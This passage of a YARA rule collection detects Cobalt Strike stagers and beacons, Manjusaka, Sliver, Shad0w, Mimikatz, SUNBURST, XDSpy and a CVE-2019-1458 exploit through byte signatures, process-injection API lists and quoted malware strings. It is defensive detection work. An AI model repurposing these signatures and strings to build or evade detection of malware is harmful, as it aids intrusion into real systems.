		uint32( @h01 + 0x01d5 ) == 0x07002600 and uint32( @h01 + 0x0205 ) == 0xa7007900 and uint32( @h01 + 0x0243 ) == 0xc6009f00 and uint32( @h01 + 0x0281 ) == 0x3b002e00 and uint32( @h01 + 0x02c9 ) == 0x7b001800 and uint32( @h01 + 0x0613 ) == 0x5600a200 and uint32( @h01 + 0x064b ) == 0xe5005300 and uint32( @h01 + 0x0687 ) == 0xe2008900
}
rule AVASTTI_Cobaltstrike_Raw_Payload_Https_Stager_X86_Utf16
{
	meta:
		description = "No description has been set in the source file - AvastTI"
		author = "Gen Threat Labs"
		id = "dcd3e5c8-7626-5a78-9f90-7a8e67311d90"
		date = "2021-07-08"
		modified = "2026-03-11"
		reference = "https://github.com/gendigitalinc/ioc"
		source_url = "https://github.com/avast/ioc/blob/eb6d7fc10cb0c57dab5a360f1fd28acae26efa97/CobaltStrike/yara_rules/cs_rules.yar#L499-L520"
		license_url = "N/A"
		logic_hash = "5003ebd545182bb105cdcaaac2105a92cdd99a0178c24eb5ae2888232897aeb5"
		score = 75
		quality = 90
		tags = ""

	strings:
		$h01 = { FC 00 E8 00 89 00 00 00 00 00 00 00 60 00 89 00 E5 00 31 00 D2 00 64 00 8B 00 52 00 30 00 8B 00 52 00 0C 00 8B 00 52 00 14 00 8B 00 72 00 28 }

	condition:
		uint32( @h01 + 0x013b ) == 0x07002600 and uint32( @h01 + 0x0161 ) == 0xa7007900 and uint32( @h01 + 0x0199 ) == 0xc6009f00 and uint32( @h01 + 0x01d1 ) == 0x3b002e00 and uint32( @h01 + 0x0203 ) == 0x86009e00 and uint32( @h01 + 0x0223 ) == 0x7b001800 and uint32( @h01 + 0x0255 ) == 0x5d00e200 and uint32( @h01 + 0x0267 ) == 0x31005e00 and uint32( @h01 + 0x0285 ) == 0x0b00e000 and uint32( @h01 + 0x05d5 ) == 0x5600a200 and uint32( @h01 + 0x05fd ) == 0xe5005300 and uint32( @h01 + 0x0633 ) == 0xe2008900
}
rule AVASTTI_Cobaltstrike_Raw_Payload_Https_Stager_X64_Utf16
{
	meta:
		description = "No description has been set in the source file - AvastTI"
		author = "Gen Threat Labs"
		id = "aa93dd56-9589-5958-9711-ca2f9c763665"
		date = "2021-07-08"
		modified = "2026-03-11"
		reference = "https://github.com/gendigitalinc/ioc"
		source_url = "https://github.com/avast/ioc/blob/eb6d7fc10cb0c57dab5a360f1fd28acae26efa97/CobaltStrike/yara_rules/cs_rules.yar#L522-L540"
		license_url = "N/A"
		logic_hash = "dee3eb3353da0179c58a33c3be0af6ad1e6aa9f13e9e6b9821c94f11d209266f"
		score = 75
		quality = 90
		tags = ""

	strings:
		$h01 = { FC 00 48 00 83 00 E4 00 F0 00 E8 00 C8 00 00 00 00 00 00 00 41 00 51 00 41 00 50 00 52 00 51 00 56 00 48 00 31 00 D2 00 65 00 48 00 8B 00 52 }

	condition:
		uint32( @h01 + 0x01d5 ) == 0x07002600 and uint32( @h01 + 0x0205 ) == 0xa7007900 and uint32( @h01 + 0x0249 ) == 0xc6009f00 and uint32( @h01 + 0x0287 ) == 0x3b002e00 and uint32( @h01 + 0x02db ) == 0x86009e00 and uint32( @h01 + 0x030f ) == 0x7b001800 and uint32( @h01 + 0x0659 ) == 0x5600a200 and uint32( @h01 + 0x0691 ) == 0xe5005300 and uint32( @h01 + 0x06cd ) == 0xe2008900
}
rule AVASTTI_Cobaltstrike_Strike_Payload_Xored
{
	meta:
		description = "No description has been set in the source file - AvastTI"
		author = "Gen Threat Labs"
		id = "0e075644-e278-5c5b-bdcc-dc2d6a32ce73"
		date = "2021-07-08"
		modified = "2026-03-11"
		reference = "https://github.com/gendigitalinc/ioc"
		source_url = "https://github.com/avast/ioc/blob/eb6d7fc10cb0c57dab5a360f1fd28acae26efa97/CobaltStrike/yara_rules/cs_rules.yar#L595-L613"
		license_url = "N/A"
		logic_hash = "532cf38554ad7211fab74d050007f6fe8d63c20e05f21a6737fff12ac92a81d7"
		score = 75
		quality = 90
		tags = ""

	strings:
		$h01 = { 10 ?? 00 00 ?? ?? ?? 00 ?? ?? ?? ?? 61 61 61 61 }

	condition:
		uint32be( @h01 + 8 ) ^ uint32be( @h01 + 16 ) == 0xFCE88900 or uint32be( @h01 + 8 ) ^ uint32be( @h01 + 16 ) == 0xFC4883E4 or uint32be( @h01 + 8 ) ^ uint32be( @h01 + 16 ) == 0x4D5AE800 or uint32be( @h01 + 8 ) ^ uint32be( @h01 + 16 ) == 0x4D5A4152 or uint32be( @h01 + 8 ) ^ uint32be( @h01 + 16 ) == 0x90909090
}
rule AVASTTI_Cobaltstrike_Beacon_X86
{
	meta:
		description = "No description has been set in the source file - AvastTI"
		author = "Gen Threat Labs"
		id = "6ffaafe6-2758-53e4-b5b8-6d8350baf428"
		date = "2021-07-08"
		modified = "2026-03-11"
		reference = "https://github.com/gendigitalinc/ioc"
		source_url = "https://github.com/avast/ioc/blob/eb6d7fc10cb0c57dab5a360f1fd28acae26efa97/CobaltStrike/yara_rules/cs_rules.yar#L615-L632"
		license_url = "N/A"
		logic_hash = "e6328aae5954ac8e3914e65603813ba4f11d97ff91d08a1398e1f71740879463"
		score = 75
		quality = 90
		tags = ""

	strings:
		$h01 = { 4D 5A E8 00 00 00 00 5B 89 DF 52 45 55 89 E5 81 C3 ?? ?? ?? ?? FF D3 68 }
		$h11 = { 00 01 00 01 00 02 ?? ?? 00 02 00 01 00 02 ?? ?? 00 }
		$h12 = { 69 68 69 68 69 6B ?? ?? 69 6B 69 68 69 6B ?? ?? 69 }
		$h13 = { 2E 2F 2E 2F 2E 2C ?? ?? 2E 2C 2E 2F 2E 2C ?? ?? 2E }

	condition:
		$h01 and any of ( $h1* )
}
rule AVASTTI_Cobaltstrike_Beacon_X64
{
	meta:
		description = "No description has been set in the source file - AvastTI"
		author = "Gen Threat Labs"
		id = "5d6d86ec-9e05-5596-b623-30f44c6f44db"
		date = "2021-07-08"
		modified = "2026-03-11"
		reference = "https://github.com/gendigitalinc/ioc"
		source_url = "https://github.com/avast/ioc/blob/eb6d7fc10cb0c57dab5a360f1fd28acae26efa97/CobaltStrike/yara_rules/cs_rules.yar#L634-L651"
		license_url = "N/A"
		logic_hash = "7abf5f9a337c60944a52efcc7a16a768652c46843d2da3df2f946dd6e63f9375"
		score = 75
		quality = 90
		tags = ""

	strings:
		$h01 = { 4D 5A 41 52 55 48 89 E5 48 81 EC 20 00 00 00 48 8D 1D EA FF FF FF 48 89 }
		$h11 = { 00 01 00 01 00 02 ?? ?? 00 02 00 01 00 02 ?? ?? 00 }
		$h12 = { 69 68 69 68 69 6B ?? ?? 69 6B 69 68 69 6B ?? ?? 69 }
		$h13 = { 2E 2F 2E 2F 2E 2C ?? ?? 2E 2C 2E 2F 2E 2C ?? ?? 2E }

	condition:
		$h01 and any of ( $h1* )
}
rule AVASTTI_Cobaltstrike_Beacon_Xored_X86
{
	meta:
		description = "No description has been set in the source file - AvastTI"
		author = "Gen Threat Labs"
		id = "d93c20e6-3e01-5132-88a0-63ace507cae9"
		date = "2021-07-08"
		modified = "2026-03-11"
		reference = "https://github.com/gendigitalinc/ioc"
		source_url = "https://github.com/avast/ioc/blob/eb6d7fc10cb0c57dab5a360f1fd28acae26efa97/CobaltStrike/yara_rules/cs_rules.yar#L705-L726"
		license_url = "N/A"
		logic_hash = "1415c8ab5b4ddd6eb0f561b570358f04f967621dfc6274e0380879563b612c27"
		score = 75
		quality = 90
		tags = ""

	strings:
		$h01 = { FC E8??000000 [0-32] EB27 ?? 8B?? 83??04 8B?? 31?? 83??04 ?? 8B?? 31?? 89?? 31?? 83??04 83??04 31?? 39?? 7402 EBEA ?? FF?? E8D4FFFFFF }
		$h02 = { FC E8??000000 [0-32] EB2B ?? 8B??00 83C504 8B??00 31?? 83C504 55 8B??00 31?? 89??00 31?? 83C504 83??04 31?? 39?? 7402 EBE8 ?? FF?? E8D0FFFFFF }
		$h11 = { 7402 EB(E8|EA) ?? FF?? E8(D0|D4)FFFFFF }

	condition:
		any of ( $h0* ) and ( uint32be( @h11 + 12 ) ^ uint32be( @h11 + 20 ) == 0x4D5AE800 or uint32be( @h11 + 12 ) ^ uint32be( @h11 + 20 ) == 0x904D5AE8 or uint32be( @h11 + 12 ) ^ uint32be( @h11 + 20 ) == 0x90904D5A or uint32be( @h11 + 12 ) ^ uint32be( @h11 + 20 ) == 0x9090904D or uint32be( @h11 + 12 ) ^ uint32be( @h11 + 20 ) == 0x90909090 )
}
rule AVASTTI_Cobaltstrike_Beacon_Xored_X64
{
	meta:
		description = "No description has been set in the source file - AvastTI"
		author = "Gen Threat Labs"
		id = "15be610a-7552-5473-8da2-639220313783"
		date = "2021-07-08"
		modified = "2026-03-11"
		reference = "https://github.com/gendigitalinc/ioc"
		source_url = "https://github.com/avast/ioc/blob/eb6d7fc10cb0c57dab5a360f1fd28acae26efa97/CobaltStrike/yara_rules/cs_rules.yar#L728-L746"
		license_url = "N/A"
		logic_hash = "11e6c8be28325d42f24fb5bb43c0b5fd35990a46857bae7c9940262a33c02a8c"
		score = 75
		quality = 90
		tags = ""

	strings:
		$h01 = { FC 4883E4F0 EB33 5D 8B4500 4883C504 8B4D00 31C1 4883C504 55 8B5500 31C2 895500 31D0 4883C504 83E904 31D2 39D1 7402 EBE7 58 FC 4883E4F0 FFD0 E8C8FFFFFF }
		$h11 = { FC 4883E4F0 FFD0 E8C8FFFFFF }

	condition:
		$h01 and ( uint32be( @h11 + 12 ) ^ uint32be( @h11 + 20 ) == 0x4D5A4152 or uint32be( @h11 + 12 ) ^ uint32be( @h11 + 20 ) == 0x904D5A41 or uint32be( @h11 + 12 ) ^ uint32be( @h11 + 20 ) == 0x90904D5A or uint32be( @h11 + 12 ) ^ uint32be( @h11 + 20 ) == 0x9090904D or uint32be( @h11 + 12 ) ^ uint32be( @h11 + 20 ) == 0x90909090 )
}
rule AVASTTI_Manjusaka_Framework_Go_Build_Id
{
	meta:
		description = "No description has been set in the source file - AvastTI"
		author = "Gen Threat Labs"
		id = "eca3324c-c029-53b5-b33d-9ec758dcd863"
		date = "2022-08-19"
		modified = "2026-03-11"
		reference = "https://github.com/gendigitalinc/ioc"
		source_url = "https://github.com/avast/ioc/blob/eb6d7fc10cb0c57dab5a360f1fd28acae26efa97/Manjusaka/Manjusaka.yar#L15-L62"
		license_url = "N/A"
		hash = "955e9bbcdf1cb230c5f079a08995f510a3b96224545e04c1b1f9889d57dd33c1"
		hash = "f275ca5129399a521c8cd9754b1133ecd2debcfafc928c01df6bd438522c564a"
		hash = "637f3080526d7d0ad5eb41bf9331fb51aaafd30f2895c00a44ad905154f76d70"
		hash = "b5c366d782426bad4ba880dc908669ff785420dea02067b12e2261dd1988f34a"
		hash = "107b094031094cbb1f081d85ec2799c3450dce32e254bda2fd1bb32edb449aa4"
		hash = "fb5835f42d5611804aaa044150a20b13dcf595d91314ebef8cf6810407d85c64"
		hash = "ff20333d38f7affbfde5b85d704ee20cd60b519cb57c70e0cf5ac1f65acf91a6"
		hash = "3581d99feb874f65f53866751b7874c106b5ce65a523972ef6a736844209043c"
		hash = "6082bf26bcc07bf299a88eaa0272022418b12156cd987adfdff9fa1517afcf3d"
		hash = "14dfb43a1782b0b8d93c3d67d63b6c786b0a223bc50c3ec68106bd18d43652a4"
		hash = "4a0f47132867c12a6d009e43812729a1bb41f4eb83472ac352fc5b20fe937bef"
		hash = "bb1b7d506559c783ed747da461f58ea5256ba0a083768ae6aa1a2325017c4387"
		hash = "bd0e09e9ee4db74ada6433f00024a543f799046c15f635216ca4ae5e1f0c42e2"
		logic_hash = "de68bc483255c9c1095771925a7c2fc3062489a4468d42e7c6aa9f0146841c5c"
		score = 75
		quality = 88
		tags = ""

	strings:
		$h01 = { 47 6F 00 00 57 79 5F 76 69 62 44 5A 76 32 77 6D 35 62 4C 32 71 73 6A 4A 2F 34 50 4D 56 79 4D 39 39 76 61 76 58 68 7A 65 5A 34 6C 76 2D 2F 4E 59 6C 5F 4B 6D 75 53 45 62 53 4E 4A 6B 39 45 61 52 74 31 2F 2D 45 4D 50 57 64 6A 73 30 4E 6C 37 73 79 67 41 41 74 65 54 00 }
		$h02 = { 47 6F 00 00 79 30 4D 57 35 6A 74 30 45 6B 61 77 55 4B 35 6B 6B 6C 31 32 2F 5A 68 34 34 36 61 65 4D 7A 62 48 47 37 4F 73 56 4F 66 71 75 2F 6D 5F 58 74 43 52 32 32 39 75 4B 67 5A 62 51 65 44 35 43 74 2F 66 78 66 47 4A 47 61 59 4E 31 5F 36 6E 4E 76 32 58 5A 53 62 00 }
		$h03 = { 47 6F 06 FF FF FF 7F 79 30 4D 57 35 6A 74 30 45 6B 61 77 55 4B 35 6B 6B 6C 31 32 2F 5A 68 34 34 36 61 65 4D 7A 62 FF FF FF FF 48 47 37 4F 73 56 4F 66 71 75 2F 6D 5F 58 74 43 52 32 32 39 75 4B 67 5A 62 51 65 44 35 43 74 2F }
		$h04 = { 47 6F 00 00 30 33 30 36 42 53 4B 42 71 6E 71 4B 74 4D 51 71 67 53 58 4D 2F 68 4C 6A 34 77 76 56 56 4A 4C 79 42 43 61 4A 42 5F 38 4D 30 2F 73 74 66 62 47 73 46 5A 58 67 4E 6B 50 77 5A 4B 4C 71 52 65 2F 4D 49 46 68 69 67 7A 65 50 53 65 56 35 64 5F 52 6D 66 43 35 00 }
		$h05 = { 47 6F 06 FF FF FF 7F 30 33 30 36 42 53 4B 42 71 6E 71 4B 74 4D 51 71 67 53 58 4D 2F 68 4C 6A 34 77 76 56 56 4A 4C FF FF FF FF 79 42 43 61 4A 42 5F 38 4D 30 2F 73 74 66 62 47 73 46 5A 58 67 4E 6B 50 77 5A 4B 4C 71 52 65 }
		$h06 = { 47 6F 00 00 36 35 34 67 69 6A 50 41 55 6B 45 61 7A 4A 70 6A 44 39 4E 55 2F 67 44 75 48 46 31 78 66 64 70 39 31 53 66 36 53 59 51 48 58 2F 76 73 6E 6E 37 65 6B 67 30 54 4B 58 57 69 4F 53 63 46 30 44 2F 53 61 6D 30 73 51 6D 66 79 43 61 44 43 38 71 43 66 59 78 35 00 }
		$h07 = { 47 6F 06 FF ED FF 7F 36 35 34 67 69 6A 50 41 55 6B 45 61 7A 4A 70 6A 44 39 68 2F 67 44 75 48 46 31 78 66 FF FF FF FF 64 70 39 31 53 66 36 53 59 51 48 58 2F 76 73 6E 6E 37 65 6B 67 30 54 4B 58 57 69 4F 53 63 46 30 }
		$h08 = { 47 6F 20 62 FF FF FF FF 75 69 6C 64 20 49 44 3A 20 22 65 72 52 47 4F 4A 56 48 65 38 37 58 67 6D 79 4F 56 77 48 44 2F 42 FB FF FF FF 70 78 56 76 70 79 44 58 74 4C 64 64 79 57 46 64 38 4E 39 2F 6F 59 77 64 70 73 6D 46 45 }
		$h09 = { 47 6F 20 62 75 69 6C 64 20 49 44 3A 20 22 65 72 52 47 4F 4A 56 48 65 38 37 58 67 6D 79 4F 56 77 48 44 2F 42 70 78 56 76 70 79 44 58 74 4C 64 64 79 57 46 64 38 4E 39 2F 6F 59 77 64 70 73 6D 46 45 44 58 39 32 58 4A 55 52 4C 55 7A 2F 62 62 58 59 38 43 76 6B 44 4D 72 69 42 33 32 64 49 36 53 58 }
		$h10 = { 47 6F 00 00 47 6E 42 4B 6F 63 4C 77 76 57 5A 6E 43 5F 55 6D 49 72 2D 72 2F 36 50 2D 4F 7A 46 62 51 37 39 6F 59 79 79 61 44 52 48 56 34 2F 38 74 6D 46 77 78 63 53 64 63 63 6D 70 66 73 5A 63 33 68 62 2F 77 34 2D 36 49 52 50 70 75 42 66 75 61 68 7A 50 63 4C 35 32 00 }
		$h11 = { 47 6F 06 FF FF FF FF 6E 42 4B 6F 63 4C 77 76 57 5A 6E 43 5F 55 6D 49 72 2D 72 2F 36 50 2D 4F 7A 46 62 51 37 39 6F FF FF 6F FF 59 79 79 61 44 52 48 56 DC 38 74 6D 46 77 78 63 53 64 63 63 6D 70 66 73 5A 63 33 68 62 }
		$h12 = { 47 6F 00 00 4E 50 57 41 64 50 62 57 6D 6E 58 72 30 61 36 67 44 37 4B 7A 2F 54 74 6E 59 64 4F 79 43 6A 76 63 43 51 75 5A 39 47 69 44 72 2F 46 43 6D 4F 69 38 41 30 36 36 52 50 43 36 53 4F 57 76 61 4D 2F 43 70 57 37 4F 30 73 38 61 51 32 42 46 56 64 66 65 62 54 4A 00 }
		$h13 = { 47 6F 06 FF FF FF 7F 4E 50 57 41 64 50 62 57 6D 6E 58 72 30 61 36 67 44 37 4B 7A 2F 54 74 6E 59 64 4F 79 43 6A 76 FF FF FF FF 63 43 51 75 5A 39 47 69 44 72 2F 46 43 6D 4F 69 38 41 30 36 36 52 50 43 36 53 4F 57 76 61 4D 2F }

	condition:
		any of them
}
private rule AVASTTI_EXE_PRIVATE : FILE
{
	meta:
		description = "No description has been set in the source file - AvastTI"
		author = "Avast Threat Intel Team"
		id = "1096b81d-5853-5d19-b502-c8166b712a3d"
		date = "2022-08-19"
		modified = "2026-03-11"
		reference = "https://github.com/avast/ioc"
		source_url = "https://github.com/avast/ioc/blob/eb6d7fc10cb0c57dab5a360f1fd28acae26efa97/Manjusaka/Manjusaka.yar#L9-L13"
		license_url = "N/A"
		logic_hash = "0688672446142f95a22e49a04234cc90b6c9021efeda9ce57034c88d84944663"
		score = 75
		quality = 90
		tags = "FILE"

	condition:
		uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550
}
private rule AVASTTI_ELF_PRIVATE
{
	meta:
		description = "No description has been set in the source file - AvastTI"
		author = "Avast Threat Intel Team"
		id = "38aa7852-e7ea-5b90-a5f6-0862ad19a051"
		date = "2022-08-19"
		modified = "2026-03-11"
		reference = "https://github.com/avast/ioc"
		source_url = "https://github.com/avast/ioc/blob/eb6d7fc10cb0c57dab5a360f1fd28acae26efa97/Manjusaka/Manjusaka.yar#L1-L7"
		license_url = "N/A"
		logic_hash = "eb05e5d53bb8dea91467a76a164542894cdb1355cf3909f56818e27c589344ec"
		score = 75
		quality = 90
		tags = ""

	strings:
		$h01 = { 7F 45 4C 46 (01|02) (01|02) 01 }

	condition:
		$h01 at 0
}
rule SBOUSSEADEN_Susp_Msoffice_Addins_Wxll : FILE
{
	meta:
		description = "hunt for suspicious MS Office Addins with code injection capabilities"
		author = "SBousseaden"
		id = "39d3b2af-f848-51c0-a13b-13c0fe3a79dd"
		date = "2020-11-10"
		modified = "2023-03-27"
		reference = "https://twitter.com/JohnLaTwC/status/1315287078855352326"
		source_url = "https://github.com/sbousseaden/YaraHunts//blob/71b27a2a7c57c2aa1877a11d8933167794e2b4fb/hunt_susp_msoffice_addins_wxll.yara#L3-L29"
		license_url = "N/A"
		logic_hash = "130a0292b16e934311597d4f91456e6a605477e306a7b1d8171cc4e13794db31"
		score = 65
		quality = 75
		tags = "FILE"

	strings:
		$inj1 = "WriteProcessMemory"
		$inj2 = "NtWriteVirtualMemory"
		$inj3 = "RtlMoveMemory"
		$inj4 = "VirtualAllocEx"
		$inj5 = "NtAllocateVirtualMemory"
		$inj6 = "NtUnmapViewOfSection"
		$inj7 = "VirtualProtect"
		$inj8 = "NtProtectVirtualMemory"
		$inj9 = "SetThreadContext"
		$inj10 = "NtSetContextThread"
		$inj11 = "ResumeThread"
		$inj12 = "NtResumeThread"
		$inj13 = "QueueUserAPC"
		$inj14 = "NtQueueApcThread"
		$inj15 = "NtQueueApcThreadEx"
		$inj16 = "CreateRemoteThread"
		$inj17 = "NtCreateThreadEx"
		$inj18 = "RtlCreateUserThread"

	condition:
		uint16( 0 ) == 0x5a4d and ( pe.exports ( "wdAutoOpen" ) or pe.exports ( "xlAutoOpen" ) ) and 3 of ( $inj* )
}

rule SBOUSSEADEN_Gosliver
{
	meta:
		description = "No description has been set in the source file - SBousseaden"
		author = "SBousseaden"
		id = "eba5043a-ca4d-5c5d-a895-51218b03e59e"
		date = "2020-10-11"
		modified = "2020-10-11"
		reference = "https://github.com/BishopFox/sliver"
		source_url = "https://github.com/sbousseaden/YaraHunts//blob/71b27a2a7c57c2aa1877a11d8933167794e2b4fb/hunt_sliver_go_framwwork.yara#L2-L9"
		license_url = "N/A"
		logic_hash = "8dc96e533adc29c78a998d9f064ff294d2ef8a4ff00cef8b0c81ef465ef70b08"
		score = 75
		quality = 75
		tags = ""

	strings:
		$go = "_cgo_"

	condition:
		#go> 10 and pe.exports ( "RunSliver" )
}
rule SBOUSSEADEN_Shad0W_Beacon_16June : FILE
{
	meta:
		description = "Shad0w beacon compressed"
		author = "SBousseaden"
		id = "1229e84f-bf6e-5e87-9351-a48cd50397b0"
		date = "2020-06-16"
		modified = "2020-06-17"
		reference = "https://github.com/bats3c/shad0w"
		source_url = "https://github.com/sbousseaden/YaraHunts//blob/71b27a2a7c57c2aa1877a11d8933167794e2b4fb/shad0w_beacon_16June.yara#L1-L13"
		license_url = "N/A"
		logic_hash = "c313e995d6eaae6d2ee63964f6fc94964065af7a61d7f304280d914e6f0dd548"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = {F2 AE ?? ?? ?? FF 15 ?? ?? 00 00 48 09 C0 74 09}
		$s2 = {33 2E 39 36 00 ?? ?? ?? 21 0D 24 0E 0A}
		$s3 = "VirtualProtect"
		$s4 = "GetProcAddress"

	condition:
		uint16( 0 ) == 0x5a4d and all of ( $s* )
}
rule SBOUSSEADEN_Cve_2019_1458 : FILE
{
	meta:
		description = "No description has been set in the source file - SBousseaden"
		author = "SBousseaden"
		id = "7bcbfccb-2db0-5438-9ed1-eee4c92710b6"
		date = "2020-10-22"
		modified = "2020-10-23"
		reference = "https://github.com/unamer/CVE-2019-1458"
		source_url = "https://github.com/sbousseaden/YaraHunts//blob/71b27a2a7c57c2aa1877a11d8933167794e2b4fb/hunt_cve_2019_1458.yara#L1-L22"
		license_url = "N/A"
		logic_hash = "8c5eac6b9fb9f87e0ffb219f0af8f83475799e062ed339da7a0525180292f5f2"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "RtlGetVersion"
		$s2 = {45 33 C9 BA 03 80 00 00 33 C9}
		$s3 = "SploitWnd"
		$s4 = "CreateWindowExW"
		$s5 = "GetKeyboardState"
		$s6 = "SetKeyboardState"
		$s7 = "SetWindowLongPtrW"
		$s9 = "SetClassLongPtrW"
		$s10 = "DestroyWindow"
		$s11 = "CreateProcess"
		$s12 = {4C 8B D1 8B 05 ?? ?? ?? 00 0F 05 C3}
		$s13 = {80 10 00 00 09 10}
		$s14 = "NtUserMessageCall"
		$s15 = "HMValidateHandle"
		$s16 = "IsMenu"

	condition:
		uint16( 0 ) == 0x5a4d and all of them
}
rule SBOUSSEADEN_TDL_Loader_Bootstrap_Shellcode : FILE
{
	meta:
		description = "No description has been set in the source file - SBousseaden"
		author = "SBousseaden"
		id = "a2adedef-ba38-599f-b52c-e2156aa5ef98"
		date = "2020-10-10"
		modified = "2020-10-10"
		reference = "https://github.com/hfiref0x/TDL"
		source_url = "https://github.com/sbousseaden/YaraHunts//blob/71b27a2a7c57c2aa1877a11d8933167794e2b4fb/tdl_loader_bootstrat_shellcode.yara#L1-L9"
		license_url = "N/A"
		logic_hash = "14a993b415e330e284503c409ab66445c5e369a21ef0be37297d9c8946b5559b"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$shc1 = {41 B8 54 64 6C 53 48 63 6B 3C 48 03 EB 44 8B 7D 50 41 8D 97 00 10 00 00 41 FF D1}
		$shc2 = {41 B8 54 64 6C 53 4C 63 73 3C 4C 03 F3 45 8B 7E 50 41 8D 97 00 10 00 00 41 FF D1 45 33 C9}

	condition:
		uint16( 0 ) == 0x5a4d and any of ( $shc* )
}
rule SBOUSSEADEN_Shad0W_Ldrloaddll_Hook : FILE
{
	meta:
		description = "Shad0w beacon LdrLoadDll hook"
		author = "SBousseaden"
		id = "f9f75b96-2341-553f-b6ca-28d6cb9b880a"
		date = "2020-06-06"
		modified = "2020-06-07"
		reference = "https://github.com/bats3c/shad0w"
		source_url = "https://github.com/sbousseaden/YaraHunts//blob/71b27a2a7c57c2aa1877a11d8933167794e2b4fb/shad0w_ldrhook.yara#L1-L13"
		license_url = "N/A"
		logic_hash = "28e8ca9eee2377fd816dd3bd29e05f4146cea975e0ba5ec180073e10a49895e0"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "LdrLoadD"
		$s2 = "SetPr"
		$s3 = "Policy"
		$s4 = {B8 49 BB DE AD C0}

	condition:
		uint16( 0 ) == 0x5a4d and all of ( $s* )
}

rule SBOUSSEADEN_Shad0W_Beacon : FILE
{
	meta:
		description = "Shad0w beacon default suspicous strings"
		author = "SBousseaden"
		id = "e725172d-dd07-5027-ac85-86d366881856"
		date = "2020-06-04"
		modified = "2020-06-05"
		reference = "https://github.com/bats3c/shad0w"
		source_url = "https://github.com/sbousseaden/YaraHunts//blob/71b27a2a7c57c2aa1877a11d8933167794e2b4fb/shad0w.yara#L3-L15"
		license_url = "N/A"
		logic_hash = "9ea7cf72da0d93f607f58b61cc0fb5f3f114d4454101c69b08c59e6b61353550"
		score = 75
		quality = 73
		tags = "FILE"

	strings:
		$s1 = "LdrLoadD"
		$s2 = {53 65 74 50 72 2A 65 73 73 4D}
		$s3 = "Policy"

	condition:
		uint16( 0 ) == 0x5a4d and all of ( $s* ) and pe.sections [ 0 ] . name == "XPU0" and pe.imports ( "winhttp.dll" , "WinHttpOpen" )
}
rule SBOUSSEADEN_Mimikatz_Kiwikey
{
	meta:
		description = "hunt for default mimikatz kiwikey"
		author = "SBousseaden"
		id = "3141e679-6e07-5017-9675-4557fb876ebc"
		date = "2020-08-08"
		modified = "2020-08-09"
		reference = "https://github.com/sbousseaden/YaraHunts/"
		source_url = "https://github.com/sbousseaden/YaraHunts//blob/71b27a2a7c57c2aa1877a11d8933167794e2b4fb/kiwikey.yara#L1-L10"
		license_url = "N/A"
		logic_hash = "03745aed838dafad2fc6e190f181141bda31c212af56edb8ba665b86671f8bee"
		score = 75
		quality = 75
		tags = ""

	strings:
		$A = {60 BA 4F CA C7 44 24 ?? DC 46 6C 7A C7 44 24 ?? 03 3C 17 81 C7 44 24 ?? 94 C0 3D F6}
		$B = {48 B8 ?? ?? ?? ?? ?? ?? ?? ?? FF D0}

	condition:
		$A and #B > 10
}
rule SBOUSSEADEN_APT_Solarwind_Backdoor_Encoded_Strings : FILE
{
	meta:
		description = "This rule is looking for some key encoded strings of the SUNBURST backdoor"
		author = "SBousseaden"
		id = "04a63bd6-9737-568f-a20e-c573b915cbd4"
		date = "2020-12-14"
		modified = "2020-12-18"
		reference = "https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html"
		source_url = "https://github.com/sbousseaden/YaraHunts//blob/71b27a2a7c57c2aa1877a11d8933167794e2b4fb/apt_solarwinds_backdoor_encoded_strings.yara#L1-L28"
		license_url = "N/A"
		hash = "846e27a652a5e1bfbd0ddd38a16dc865"
		logic_hash = "8808cca8d89f089a8bca5ef62c1764061c8210ba5f9813c886d6ed9f79579ba6"
		score = 75
		quality = 75
		tags = "FILE"
		sha2 = "ce77d116a074dab7a22a0fd4f2c1ab475f16eec42e1ded3c0b0aa8211fe858d6"

	strings:
		$sw = "SolarWinds"
		$priv1 = "C04NScxO9S/PSy0qzsgsCCjKLMvMSU1PBQA=" wide
		$priv2 = "C04NzigtSckvzwsoyizLzElNTwUA" wide
		$priv3 = "C04NSi0uyS9KDSjKLMvMSU1PBQA=" wide
		$disc1 = "C0gsSs0rCSjKT04tLvZ0AQA=" wide
		$disc2 = "c0zJzczLLC4pSizJLwIA" wide
		$disc3 = "c/ELdsnPTczMCy5NS8usCE5NLErO8C9KSS0CAA==" wide
		$wmi1 = "C07NSU0uUdBScCvKz1UIz8wzNooPriwuSc11KcosSy0CAA==" wide
		$wmi2 = "C07NSU0uUdBScCvKz1UIz8wzNooPKMpPTi0uBgA=" wide
		$wmi3 = "C07NSU0uUdBScCvKz1UIz8wzNooPLU4tckxOzi/NKwEA" wide
		$wmi4 = "C07NSU0uUdBScCvKz1UIz8wzNor3Sy0pzy/KdkxJLChJLXLOz0vLTC8tSizJzM9TKM9ILUpV8AxwzUtMyklNsS0pKk0FAA=="
		$key1 = "C44MDnH1jXEuLSpKzStxzs8rKcrPCU4tiSlOLSrLTE4tBgA=" wide
		$key2 = "Cy5JLCoBAA==" wide
		$pat1 = "i6420DGtjVWoNqzlAgA=" wide
		$pat2 = "i6420DGtjVWoNtTRNTSrVag2quWsNgYKKVSb1MZUm9ZyAQA=" wide
		$pat3 = "qzaoVag2rFXwCAkJ0K82quUCAA==" wide
		$pat4 = {9D 2A 9A F3 27 D6 F8 EF}

	condition:
		uint16( 0 ) == 0x5a4d and $sw and ( 2 of ( $pat* ) or 2 of ( $priv* ) or all of ( $disc* ) or 2 of ( $wmi* ) or all of ( $key* ) )
}
rule SBOUSSEADEN_APT_Xdsspy_Xdupload : FILE
{
	meta:
		description = "No description has been set in the source file - SBousseaden"
		author = "SBousseaden"
		id = "ae38d017-6420-596c-af29-62f15cfe56b8"
		date = "2020-05-10"
		modified = "2020-10-05"
		reference = "https://www.welivesecurity.com/2020/10/02/xdspy-stealing-government-secrets-since-2011/"
		source_url = "https://github.com/sbousseaden/YaraHunts//blob/71b27a2a7c57c2aa1877a11d8933167794e2b4fb/apt_xdspy_xdupload.yara#L1-L11"
		license_url = "N/A"
		logic_hash = "648ea81d1b44d8514439683cf2f86a8027f9e1eb64abf76d42347fc2ce9c4e68"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "cmd.exe /u /c cd /d \"%s\" & dir /a /-c" wide
		$s2 = "commandC_dll.dll"
